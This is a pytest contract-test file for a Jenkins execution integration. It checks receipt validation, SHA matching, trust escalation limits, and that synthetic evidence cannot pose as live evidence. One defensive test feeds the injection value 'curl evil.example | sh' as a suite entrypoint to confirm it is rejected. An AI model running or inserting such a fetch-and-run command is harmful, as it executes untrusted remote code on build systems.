"""Contract tests for the Jenkins consumer integration (API-390).

These tests prove the real contract flow::

    ExecutionPlan -> Jenkins execution request -> synthetic executor result
        -> QualityReceipt submission -> Test Platform validation

without a live Jenkins controller, GitHub Actions, provider credentials, or
deployment. Every fixture is synthetic and is labelled as such; synthetic
evidence can never be mistaken for live qualification.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from datetime import UTC, datetime
from pathlib import Path

import pytest

from test_platform.canonical import semantic_hash
from test_platform.contracts import (
    Diagnostic,
    EvidenceClass,
    EvidenceOrigin,
    EvidenceReference,
    ExecutionTrustClass,
    JenkinsExecutionMode,
    JenkinsExecutionRequest,
    JenkinsExecutionStatus,
    JenkinsReceiptSubmission,
    JenkinsSuiteOutcome,
    QualityReceipt,
    QualityResult,
)
from test_platform.integration.catalog import ContractCatalogError, load_consumer_contract
from test_platform.integration.compile import (
    JenkinsContractError,
    compile_jenkins_execution_request,
)
from test_platform.integration.ingest import (
    ReceiptIngestError,
    ingest_jenkins_receipt_submission,
)
from test_platform.integration.qualification import (
    SYNTHETIC_REPOSITORY,
    SYNTHETIC_RESULTS,
    SYNTHETIC_SHA,
    build_synthetic_qualification,
)
from test_platform.trust import TRUST_CAPABILITIES

GENERATED_AT = datetime(2026, 9, 27, 0, 0, 0, tzinfo=UTC)


def _qualification(
    trust: ExecutionTrustClass = ExecutionTrustClass.PR_UNTRUSTED,
):
    return build_synthetic_qualification(trust=trust)


def _result(status: str, **overrides: object) -> dict[str, object]:
    result: dict[str, object] = {
        "suite_id": "verify",
        "executor_id": "container-infrastructure",
        "status": status,
        "observed_repository": SYNTHETIC_REPOSITORY,
        "observed_sha": SYNTHETIC_SHA,
        "passed_tests": 412,
        "failed_tests": 0,
        "skipped_tests": 3,
        "duration_seconds": 12.5,
        "artifacts": ["verify/verify.log", "verify/results.json"],
        "tool_versions": [{"name": "node", "version": "22.23.3"}],
    }
    result.update(overrides)
    return result


def _receipt_payload(
    request: JenkinsExecutionRequest,
    suite_id: str,
    executor: str,
    result: QualityResult,
    outcome: dict[str, object],
) -> dict[str, object]:
    return {
        "plan_id": request.plan.plan_id,
        "repository": request.plan.repository,
        "sha": request.plan.sha,
        "profile": request.plan.profile.model_dump(mode="json"),
        "suite_id": suite_id,
        "executor": executor,
        "trust": request.plan.trust.value,
        "result": result.value,
        "passed_tests": outcome["passed_tests"],
        "failed_tests": outcome["failed_tests"],
        "skipped_tests": outcome["skipped_tests"],
        "duration_seconds": float(outcome["duration_seconds"]),
        "tool_versions": outcome["tool_versions"],
    }


def _submission(
    request: JenkinsExecutionRequest,
    results: list[dict[str, object]],
    *,
    evidence_origin: EvidenceOrigin = EvidenceOrigin.SYNTHETIC,
) -> JenkinsReceiptSubmission:
    """Build a submission exactly as the trusted Jenkins adapter does."""
    by_suite = {str(result["suite_id"]): result for result in results}
    outcomes: list[JenkinsSuiteOutcome] = []
    for binding in request.suites:
        result = by_suite[binding.suite_id]
        status = JenkinsExecutionStatus(str(result["status"]))
        rule = request.result_for(status)
        declared = {artifact.path: artifact for artifact in binding.artifacts}
        fallback_class = binding.artifacts[0].evidence_class
        evidence = []
        for reference in result["artifacts"]:
            artifact = declared.get(str(reference))
            evidence.append(
                {
                    "evidence_id": (
                        f"{binding.suite_id}."
                        f"{artifact.artifact_id if artifact else 'undeclared'}"
                    ),
                    "evidence_class": (
                        artifact.evidence_class if artifact else fallback_class
                    ).value,
                    "live": artifact.live if artifact else False,
                    "source": "jenkins",
                    "reference": str(reference),
                }
            )
        payload = _receipt_payload(
            request, binding.suite_id, binding.executor_id, rule, result
        )
        payload["evidence"] = evidence
        evidence_references = tuple(
            EvidenceReference(
                evidence_id=str(item["evidence_id"]),
                evidence_class=EvidenceClass(str(item["evidence_class"])),
                live=bool(item["live"]),
                source=str(item["source"]),
                reference=str(item["reference"]),
            )
            for item in evidence
        )
        receipt = QualityReceipt(
            schema_version="1",
            receipt_id=f"receipt:{semantic_hash(payload)[:24]}",
            plan_id=payload["plan_id"],
            repository=payload["repository"],
            sha=payload["sha"],
            profile=request.plan.profile,
            suite_id=payload["suite_id"],
            executor=payload["executor"],
            trust=payload["trust"],
            result=QualityResult(payload["result"]),
            passed_tests=payload["passed_tests"],
            failed_tests=payload["failed_tests"],
            skipped_tests=payload["skipped_tests"],
            duration_seconds=payload["duration_seconds"],
            evidence=evidence_references,
            tool_versions=payload["tool_versions"],
            generated_at=GENERATED_AT,
        )
        outcomes.append(
            JenkinsSuiteOutcome(
                suite_id=binding.suite_id,
                executor_id=binding.executor_id,
                status=status,
                observed_head={
                    "repository": str(result["observed_repository"]),
                    "sha": str(result["observed_sha"]),
                },
                receipt=receipt,
            )
        )
    return JenkinsReceiptSubmission(
        schema_version="1",
        contract_id=request.contract_id,
        contract_version=request.contract_version,
        plan_id=request.plan.plan_id,
        head={"repository": request.plan.repository, "sha": request.plan.sha},
        execution_mode=request.execution_mode,
        evidence_origin=evidence_origin,
        outcomes=tuple(outcomes),
        generated_at=GENERATED_AT,
    )


def _ingest(
    qualification,
    results: list[dict[str, object]],
    **kwargs: object,
) -> tuple[QualityReceipt, ...]:
    submission = _submission(qualification.request, results, **kwargs)
    receipts, _ = ingest_jenkins_receipt_submission(
        qualification.request, submission, qualification.contract
    )
    return receipts


def test_valid_deterministic_plan_produces_a_valid_receipt() -> None:
    qualification = _qualification()
    receipts = _ingest(qualification, [dict(result) for result in SYNTHETIC_RESULTS])
    assert len(receipts) == 1
    receipt = receipts[0]
    assert receipt.result is QualityResult.PASS
    assert receipt.plan_id == qualification.request.plan.plan_id
    assert receipt.suite_id == "verify"
    assert receipt.executor == "container-infrastructure"
    assert receipt.passed_tests == 412
    assert receipt.failed_tests == 0
    assert receipt.evidence


def test_exact_sha_is_preserved_end_to_end() -> None:
    qualification = _qualification()
    submission = _submission(qualification.request, [dict(r) for r in SYNTHETIC_RESULTS])
    assert submission.head.sha == SYNTHETIC_SHA
    assert submission.head.repository == SYNTHETIC_REPOSITORY
    outcome = submission.outcomes[0]
    assert outcome.observed_head.sha == SYNTHETIC_SHA
    assert outcome.receipt.sha == SYNTHETIC_SHA
    assert outcome.receipt.repository == SYNTHETIC_REPOSITORY


def test_sha_mismatch_is_rejected() -> None:
    qualification = _qualification()
    results = [dict(result) for result in SYNTHETIC_RESULTS]
    results[0]["observed_sha"] = "b" * 40
    with pytest.raises(ReceiptIngestError):
        _ingest(qualification, results)


def test_repository_mismatch_is_rejected() -> None:
    qualification = _qualification()
    results = [dict(result) for result in SYNTHETIC_RESULTS]
    results[0]["observed_repository"] = "setnessconsulting/project-jenkins"
    with pytest.raises(ReceiptIngestError):
        _ingest(qualification, results)


def test_unsupported_plan_version_fails_closed() -> None:
    qualification = _qualification()
    future = qualification.plan.model_copy(update={"schema_version": "2"})
    with pytest.raises(JenkinsContractError, match="unsupported execution plan schema version"):
        compile_jenkins_execution_request(future, qualification.contract)


def test_unsupported_receipt_version_fails_closed() -> None:
    qualification = _qualification()
    submission = _submission(qualification.request, [dict(r) for r in SYNTHETIC_RESULTS])
    future = submission.model_copy(update={"schema_version": "2"})
    with pytest.raises(ReceiptIngestError, match="unsupported submission schema version"):
        ingest_jenkins_receipt_submission(
            qualification.request, future, qualification.contract
        )


def test_unsupported_contract_version_fails_closed() -> None:
    qualification = _qualification()
    submission = _submission(qualification.request, [dict(r) for r in SYNTHETIC_RESULTS])
    future = submission.model_copy(update={"contract_version": "2.0.0"})
    with pytest.raises(ReceiptIngestError, match="contract version does not match"):
        ingest_jenkins_receipt_submission(
            qualification.request, future, qualification.contract
        )


def test_unapproved_repository_fails_closed() -> None:
    qualification = _qualification()
    foreign = qualification.plan.model_copy(
        update={"repository": "unknown-corp/not-approved"}
    )
    with pytest.raises(JenkinsContractError, match="not approved"):
        compile_jenkins_execution_request(foreign, qualification.contract)


def test_pr_untrusted_cannot_escalate_into_trusted_capabilities() -> None:
    qualification = _qualification(trust=ExecutionTrustClass.PR_UNTRUSTED)
    grant = qualification.request.trust_grant
    assert grant.trust is ExecutionTrustClass.PR_UNTRUSTED
    assert set(grant.capabilities) == set(TRUST_CAPABILITIES[ExecutionTrustClass.PR_UNTRUSTED])
    assert "bounded-test-credentials" not in grant.capabilities
    assert "bounded-provider-credentials" not in grant.capabilities
    assert "live-provider-read" not in grant.capabilities


def test_pr_untrusted_cannot_declare_a_higher_trust_suite() -> None:
    qualification = _qualification(trust=ExecutionTrustClass.PR_UNTRUSTED)
    escalated = qualification.plan.model_copy(
        update={
            "suites": tuple(
                suite.model_copy(update={"trust": ExecutionTrustClass.LIVE_QUALIFICATION})
                for suite in qualification.plan.suites
            )
        }
    )
    with pytest.raises(JenkinsContractError, match="requires higher trust"):
        compile_jenkins_execution_request(escalated, qualification.contract)


def test_pr_untrusted_cannot_request_live_qualification_surfaces() -> None:
    qualification = _qualification(trust=ExecutionTrustClass.PR_UNTRUSTED)
    live_plan = qualification.plan.model_copy(
        update={
            "suites": (
                qualification.plan.suites[0].model_copy(
                    update={
                        "suite_id": "qualify:live",
                        "entrypoint": "qualify:live",
                        "evidence_classes": (EvidenceClass.LIVE,),
                    }
                ),
            )
        }
    )
    with pytest.raises(JenkinsContractError, match="live qualification surfaces"):
        compile_jenkins_execution_request(live_plan, qualification.contract)


def test_target_pr_cannot_choose_an_unapproved_suite() -> None:
    qualification = _qualification()
    foreign = qualification.plan.model_copy(
        update={
            "suites": (
                qualification.plan.suites[0].model_copy(update={"suite_id": "release-production"}),
            )
        }
    )
    with pytest.raises(JenkinsContractError, match="no approved Jenkins executor mapping"):
        compile_jenkins_execution_request(foreign, qualification.contract)


def test_target_pr_cannot_substitute_an_arbitrary_entrypoint() -> None:
    qualification = _qualification()
    injection = qualification.plan.model_copy(
        update={
            "suites": (
                qualification.plan.suites[0].model_copy(
                    update={"entrypoint": "curl evil.example | sh"}
                ),
            )
        }
    )
    with pytest.raises(JenkinsContractError):
        compile_jenkins_execution_request(injection, qualification.contract)

    unapproved = qualification.plan.model_copy(
        update={
            "suites": (
                qualification.plan.suites[0].model_copy(
                    update={"entrypoint": "release-production"}
                ),
            )
        }
    )
    with pytest.raises(JenkinsContractError, match="entrypoint"):
        compile_jenkins_execution_request(unapproved, qualification.contract)


def test_compiled_request_carries_no_repository_controlled_command() -> None:
    qualification = _qualification()
    request = qualification.request
    serialized = json.dumps(request.model_dump(mode="json"))
    for forbidden in ("command", "shell", "script", "argv", "token", "credential"):
        assert forbidden not in serialized.lower()
    for binding in request.suites:
        assert binding.entrypoint == "verify"
        assert not set(binding.entrypoint) & set(";&|`$<>")


@pytest.mark.parametrize(
    ("status", "expected"),
    [
        ("passed", QualityResult.PASS),
        ("failed", QualityResult.FAIL),
        ("agent-unavailable", QualityResult.BLOCKED),
        ("controller-unavailable", QualityResult.BLOCKED),
        ("timed-out", QualityResult.BLOCKED),
        ("cancelled", QualityResult.BLOCKED),
        ("stale-head", QualityResult.BLOCKED),
        ("checkout-sha-mismatch", QualityResult.BLOCKED),
        ("unsupported-capability", QualityResult.BLOCKED),
        ("rejected-trust", QualityResult.BLOCKED),
        ("malformed-result", QualityResult.NOT_EVALUABLE),
    ],
)
def test_normalized_outcome_mapping_never_flattens_to_a_pass(
    status: str, expected: QualityResult
) -> None:
    qualification = _qualification()
    results = [_result(status)]
    if status == "failed":
        results[0]["failed_tests"] = 2
    if status == "stale-head":
        results[0]["observed_sha"] = "c" * 40
    receipts = _ingest(qualification, results)
    assert receipts[0].result is expected
    if status != "passed":
        assert receipts[0].result is not QualityResult.PASS


def test_infrastructure_failure_never_becomes_a_pass() -> None:
    qualification = _qualification()
    for status in ("agent-unavailable", "controller-unavailable", "timed-out", "cancelled"):
        receipts = _ingest(qualification, [_result(status)])
        assert receipts[0].result is QualityResult.BLOCKED


def test_stale_head_is_represented_as_blocked_never_silently_accepted() -> None:
    qualification = _qualification()
    results = [_result("stale-head", observed_sha="c" * 40)]
    submission = _submission(qualification.request, results)
    assert submission.outcomes[0].status is JenkinsExecutionStatus.STALE_HEAD
    assert submission.outcomes[0].observed_head.sha == "c" * 40
    receipts, _ = ingest_jenkins_receipt_submission(
        qualification.request, submission, qualification.contract
    )
    assert receipts[0].result is QualityResult.BLOCKED
    assert receipts[0].sha == SYNTHETIC_SHA


def test_stale_head_policy_can_never_resolve_to_a_pass() -> None:
    qualification = _qualification()
    with pytest.raises(JenkinsContractError, match="stale head"):
        compile_jenkins_execution_request(
            qualification.plan,
            qualification.contract,
            stale_head=qualification.request.stale_head.model_copy(
                update={"on_stale_head": "pass"}
            ),
        )


def test_cancellation_at_a_superseded_head_stays_a_cancellation() -> None:
    qualification = _qualification()
    results = [_result("cancelled", observed_sha="c" * 40)]
    submission = _submission(qualification.request, results)
    assert submission.outcomes[0].status is JenkinsExecutionStatus.CANCELLED
    receipts, _ = ingest_jenkins_receipt_submission(
        qualification.request, submission, qualification.contract
    )
    assert receipts[0].result is QualityResult.BLOCKED


def test_a_pass_observed_at_a_different_sha_is_rejected() -> None:
    qualification = _qualification()
    results = [_result("passed", observed_sha="c" * 40)]
    submission = _submission(qualification.request, results)
    with pytest.raises(ReceiptIngestError):
        ingest_jenkins_receipt_submission(
            qualification.request, submission, qualification.contract
        )


def test_a_real_failure_observed_at_a_different_sha_is_rejected() -> None:
    qualification = _qualification()
    results = [_result("failed", failed_tests=2, observed_sha="c" * 40)]
    submission = _submission(qualification.request, results)
    with pytest.raises(ReceiptIngestError):
        ingest_jenkins_receipt_submission(
            qualification.request, submission, qualification.contract
        )


def test_jenkins_specific_data_does_not_leak_into_quality_profile_policy() -> None:
    from test_platform.contracts import QualityProfile

    profile_fields = set(QualityProfile.model_fields)
    for jenkins_specific in (
        "executor_id",
        "suite_id",
        "entrypoint",
        "agent_class",
        "command_tokens",
        "jenkins",
    ):
        assert jenkins_specific not in profile_fields

    qualification = _qualification()
    assert qualification.plan.profile.profile_id == "infrastructure-tool-v1"
    assert qualification.request.plan.profile == qualification.plan.profile


def test_artifact_evidence_handoff_is_bounded() -> None:
    qualification = _qualification()
    results = [_result("passed", artifacts=["verify/verify.log", "verify/undeclared.bin"])]
    submission = _submission(qualification.request, results)
    with pytest.raises(ReceiptIngestError, match="undeclared"):
        ingest_jenkins_receipt_submission(
            qualification.request, submission, qualification.contract
        )


def test_evidence_references_are_bounded_per_suite() -> None:
    qualification = _qualification()
    results = [
        _result("passed", artifacts=["verify/verify.log"] * 9),
    ]
    submission = _submission(qualification.request, results)
    with pytest.raises(ReceiptIngestError, match="bounded"):
        ingest_jenkins_receipt_submission(
            qualification.request, submission, qualification.contract
        )


def test_diagnostics_are_bounded_per_outcome() -> None:
    qualification = _qualification()
    submission = _submission(qualification.request, [dict(r) for r in SYNTHETIC_RESULTS])
    outcome = submission.outcomes[0]
    verbose = outcome.model_copy(
        update={
            "diagnostics": outcome.diagnostics
            + tuple(
                {
                    "code": f"jenkins.noisy.{index}",
                    "severity": "warning",
                    "message": "x" * 2049,
                }
                for index in range(9)
            )
        }
    )
    bloated = submission.model_copy(
        update={"outcomes": (verbose,)}
    )
    with pytest.raises(ReceiptIngestError):
        ingest_jenkins_receipt_submission(
            qualification.request, bloated, qualification.contract
        )


def test_incomplete_execution_cannot_drop_a_planned_suite() -> None:
    qualification = _qualification()
    submission = _submission(qualification.request, [dict(r) for r in SYNTHETIC_RESULTS])
    outcome = submission.outcomes[0]
    renamed = outcome.model_copy(
        update={
            "suite_id": "standard",
            "receipt": outcome.receipt.model_copy(update={"suite_id": "standard"}),
        }
    )
    incomplete = submission.model_copy(update={"outcomes": (renamed,)})
    with pytest.raises(ReceiptIngestError, match="exactly one outcome per planned suite"):
        ingest_jenkins_receipt_submission(
            qualification.request, incomplete, qualification.contract
        )


def test_synthetic_evidence_cannot_masquerade_as_live_qualification() -> None:
    qualification = _qualification()
    submission = _submission(qualification.request, [dict(r) for r in SYNTHETIC_RESULTS])
    outcome = submission.outcomes[0]
    live_evidence = tuple(
        item.model_copy(update={"live": True}) for item in outcome.receipt.evidence
    )
    masquerade = submission.model_copy(
        update={
            "outcomes": (
                outcome.model_copy(
                    update={
                        "receipt": outcome.receipt.model_copy(
                            update={"evidence": live_evidence}
                        )
                    }
                ),
            ),
            "evidence_origin": EvidenceOrigin.LIVE,
        }
    )
    with pytest.raises(ReceiptIngestError, match="live"):
        ingest_jenkins_receipt_submission(
            qualification.request, masquerade, qualification.contract
        )


def test_live_evidence_requires_controller_execution_and_live_trust() -> None:
    qualification = _qualification()
    live_plan = qualification.plan.model_copy(
        update={"trust": ExecutionTrustClass.LIVE_QUALIFICATION}
    )
    live_request = compile_jenkins_execution_request(
        live_plan, qualification.contract
    )
    submission = _submission(
        live_request, [dict(r) for r in SYNTHETIC_RESULTS], evidence_origin=EvidenceOrigin.LIVE
    )
    outcome = submission.outcomes[0]
    live_evidence = tuple(
        item.model_copy(update={"live": True}) for item in outcome.receipt.evidence
    )
    live_submission = submission.model_copy(
        update={
            "outcomes": (
                outcome.model_copy(
                    update={
                        "receipt": outcome.receipt.model_copy(
                            update={"evidence": live_evidence}
                        )
                    }
                ),
            ),
        }
    )
    assert live_submission.execution_mode is JenkinsExecutionMode.SYNTHETIC_QUALIFICATION
    with pytest.raises(ReceiptIngestError, match="live"):
        ingest_jenkins_receipt_submission(
            live_request, live_submission, qualification.contract
        )


def test_receipt_replay_is_explicitly_rejected() -> None:
    qualification = _qualification()
    submission = _submission(qualification.request, [dict(r) for r in SYNTHETIC_RESULTS])
    receipts, _ = ingest_jenkins_receipt_submission(
        qualification.request, submission, qualification.contract
    )
    with pytest.raises(ReceiptIngestError, match="replay"):
        ingest_jenkins_receipt_submission(
            qualification.request,
            submission,
            qualification.contract,
            seen_receipt_ids=[receipt.receipt_id for receipt in receipts],
        )


def test_consumer_contract_identity_is_allowlisted() -> None:
    contract = load_consumer_contract()
    assert contract.contract_id == "jenkins-execution-contract"
    assert contract.plan_schema_versions == ("1",)
    assert contract.receipt_schema_versions == ("1",)
    with pytest.raises(ContractCatalogError):
        load_consumer_contract("unknown-contract")


def test_synthetic_qualification_marks_itself_as_non_live() -> None:
    qualification = _qualification()
    report = {
        "qualification": "synthetic",
        "live_qualification": False,
        "execution_mode": qualification.request.execution_mode.value,
        "evidence_origin": EvidenceOrigin.SYNTHETIC.value,
    }
    assert report["live_qualification"] is False
    assert report["execution_mode"] == "synthetic-qualification"
    assert report["evidence_origin"] == "synthetic"


def _adapter_command() -> list[str] | None:
    node = shutil.which("node")
    if node is None:
        return None
    jenkins_root = Path(__file__).resolve().parents[2] / "project-jenkins"
    adapter = jenkins_root / "integration" / "test-platform-contract" / "src" / "cli.mjs"
    if not adapter.is_file():
        return None
    return [node, str(adapter)]


def test_end_to_end_synthetic_qualification_through_the_real_adapter() -> None:
    adapter = _adapter_command()
    if adapter is None:
        pytest.skip("node and the project-jenkins checkout are required for the adapter path")
    qualification = _qualification()
    workdir = Path(".jenkins-qualification")
    workdir.mkdir(exist_ok=True)
    request_path = workdir / "execution-request.json"
    results_path = workdir / "executor-results.json"
    submission_path = workdir / "receipt-submission.json"
    request_path.write_text(
        json.dumps(qualification.request.model_dump(mode="json")), encoding="utf-8"
    )
    results_path.write_text(json.dumps(list(SYNTHETIC_RESULTS)), encoding="utf-8")
    completed = subprocess.run(  # noqa: S603
        [*adapter, "finalize", str(request_path), str(results_path), str(submission_path)],
        capture_output=True,
        text=True,
        check=False,
    )
    assert completed.returncode == 0, completed.stderr
    submission = JenkinsReceiptSubmission.model_validate_json(
        submission_path.read_text(encoding="utf-8")
    )
    receipts, diagnostics = ingest_jenkins_receipt_submission(
        qualification.request, submission, qualification.contract
    )
    assert len(receipts) == 1
    assert receipts[0].result is QualityResult.PASS
    assert receipts[0].sha == SYNTHETIC_SHA
    assert receipts[0].trust is ExecutionTrustClass.PR_UNTRUSTED
    assert all(
        isinstance(diagnostic, Diagnostic) for diagnostic in diagnostics
    )


def test_synthetic_diagnostics_are_bounded_and_clear() -> None:
    from test_platform.integration.qualification import synthetic_diagnostics

    qualification = _qualification()
    receipts = _ingest(qualification, [dict(r) for r in SYNTHETIC_RESULTS])
    diagnostics = synthetic_diagnostics(receipts)
    assert len(diagnostics) == 1
    assert diagnostics[0].code == "qualification.synthetic"
    assert "no Jenkins controller" in diagnostics[0].message
